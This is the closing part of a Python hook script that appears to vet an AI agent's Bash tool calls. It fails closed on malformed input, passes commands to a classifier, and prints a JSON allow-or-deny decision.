    if tool_name is not None and not isinstance(tool_name, str):
        _fail_closed("tool_name in the payload is not a string. Failing closed")
        return 0
    if tool_name != "Bash":
        print(json.dumps({"decision": "allow", "reason": "not a Bash tool call"}))
        return 0

    tool_input = payload.get("tool_input")
    if tool_input is not None and not isinstance(tool_input, dict):
        _fail_closed("tool_input in the payload is not a JSON object. Failing closed")
        return 0
    tool_input = tool_input or {}

    command = tool_input.get("command")
    if command is not None and not isinstance(command, str):
        _fail_closed("tool_input.command in the payload is not a string. Failing closed")
        return 0
    if not command:
        print(json.dumps({"decision": "allow", "reason": "empty command"}))
        return 0

    verdict = classify(command)
    print(
        json.dumps(
            {
                "decision": "deny" if verdict.deny else "allow",
                "reason": verdict.reason,
                "is_git_push": verdict.is_git_push,
                # Issue #1375: a genuine JSON array, not a newline-joined
                # string -- a path containing a newline would otherwise
                # split into fragments that each match nothing on the live
                # `git diff` check and silently pass. `json.dumps` encodes
                # a tuple as a JSON array natively.
                "checkout_restore_paths": verdict.checkout_restore_paths,
            }
        )
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
